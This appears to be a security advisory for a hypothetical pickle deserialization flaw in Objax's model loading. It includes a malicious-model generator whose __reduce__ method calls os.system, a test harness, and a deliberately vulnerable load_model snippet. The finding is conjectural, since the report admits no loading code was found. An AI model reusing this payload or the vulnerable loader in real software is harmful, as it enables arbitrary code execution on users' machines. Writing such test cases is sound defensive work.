### Vulnerability Name: Deserialization of Untrusted Data in Model Loading

### Description:
1. An attacker crafts a malicious file intended to represent a saved Objax model. This file is designed to exploit deserialization mechanisms within Objax's model loading functionality.
2. The attacker distributes this malicious model file through channels like public repositories, email, or compromised websites, enticing Objax users to download and use it.
3. A user, intending to load a pre-trained model, uses Objax's model loading function and unknowingly loads the attacker's malicious file.
4. During the deserialization process, the malicious file triggers the execution of arbitrary code embedded within it. This is possible if Objax uses insecure deserialization practices, for example, using Python's `pickle` or similar libraries without proper sanitization when loading model files.

### Impact:
- **Critical**: Successful exploitation of this vulnerability allows for arbitrary code execution on the user's machine. This could lead to:
    - Complete compromise of the user's system.
    - Data exfiltration and theft of sensitive information.
    - Installation of malware, ransomware, or other malicious software.
    - Denial of service or disruption of user's workflows.

### Vulnerability Rank: Critical

### Currently Implemented Mitigations:
- Based on the provided PROJECT FILES, there is no evidence of any implemented mitigations for deserialization vulnerabilities in model loading, as the relevant code is not present.

### Missing Mitigations:
- **Input Sanitization and Validation**: When loading model files, Objax should thoroughly validate and sanitize the input data to ensure it conforms to the expected format and does not contain malicious code.
- **Secure Deserialization Practices**: Avoid using insecure deserialization libraries like Python's `pickle` directly. If deserialization is necessary, use safer alternatives or implement robust security measures to prevent code execution during deserialization.
- **Sandboxing or Isolation**: If possible, load and deserialize model files in a sandboxed or isolated environment to limit the potential impact of a successful exploit.
- **User Awareness and Documentation**: Provide clear warnings and documentation to users about the risks of loading model files from untrusted sources and best practices for mitigating these risks.

### Preconditions:
1. Objax project must contain functionality to load models from external files.
2. This model loading functionality must employ a deserialization process that is vulnerable to code injection, such as using `pickle` without proper safeguards.
3. The user must download and attempt to load a malicious model file provided by the attacker.

### Source Code Analysis:
- **No Source Code Available in PROJECT FILES**: The provided PROJECT FILES do not contain any code related to model saving or loading. Therefore, a source code analysis to pinpoint the vulnerability is not possible with the given information.
- **Assumed Vulnerable Code (Hypothetical)**: If Objax has model loading functionality that uses `pickle.load(file)` directly without any sanitization, it would be vulnerable.
    ```python
    # Hypothetical vulnerable code snippet (not found in PROJECT FILES)
    import pickle
    import objax

    def load_model(file_path):
        with open(file_path, 'rb') as f:
            model = pickle.load(f) # POTENTIALLY VULNERABLE LINE
        return model
    ```
    In this hypothetical scenario, the `pickle.load(f)` line is vulnerable because it directly deserializes the data from the file without any security checks, allowing for arbitrary code execution if the file is maliciously crafted.

### Security Test Case:
1. **Setup Malicious Model File:**
    - Create a Python script `malicious_model_generator.py` to generate a malicious model file. This script will use `pickle` to serialize a payload that executes arbitrary code when deserialized.
    ```python
    # malicious_model_generator.py
    import pickle
    import objax
    import os

    class MaliciousModel(objax.Module):
        def __reduce__(self):
            return (os.system, ('touch /tmp/pwned',)) # Malicious payload: creates file /tmp/pwned

    model = MaliciousModel()
    with open('malicious_model.objax', 'wb') as f:
        pickle.dump(model, f)
    ```
    - Run `python malicious_model_generator.py` to create `malicious_model.objax`.

2. **Prepare Test Environment:**
    - Assume a user has a publicly accessible instance of Objax project (e.g., a Colab notebook or a local installation).
    - Place the `malicious_model.objax` file in a location accessible to the user (e.g., cloud storage, local web server).

3. **Exploit Execution:**
    - In the Objax environment, simulate a user attempting to load the malicious model using a hypothetical `load_model` function (or the actual Objax model loading function if it exists):
    ```python
    # In Objax environment (Colab notebook or local installation)
    import objax
    import pickle
    import os

    # Hypothetical vulnerable load_model function (or use actual Objax function if exists)
    def load_model(file_path):
        with open(file_path, 'rb') as f:
            model = pickle.load(f) # POTENTIALLY VULNERABLE LINE
        return model

    try:
        model = load_model('malicious_model.objax')
        print("Model loaded (this line should not be reached if exploit is successful)")
    except Exception as e:
        print(f"Error during model loading: {e}")

    # Check for successful code execution (file creation in /tmp)
    if os.path.exists('/tmp/pwned'):
        print("[VULNERABILITY CONFIRMED] Arbitrary code execution successful!")
        os.remove('/tmp/pwned') # Cleanup
    else:
        print("[VULNERABILITY TEST FAILED] Code execution was not successful.")
    ```

4. **Verification:**
    - Run the Objax code snippet.
    - If the file `/tmp/pwned` is created on the system where Objax code is executed, it confirms the deserialization vulnerability and successful arbitrary code execution.
    - If an error occurs during model loading or the file is not created, the test case does not prove the vulnerability with this specific test, but further investigation with different payloads and analysis of the actual model loading code is still recommended.
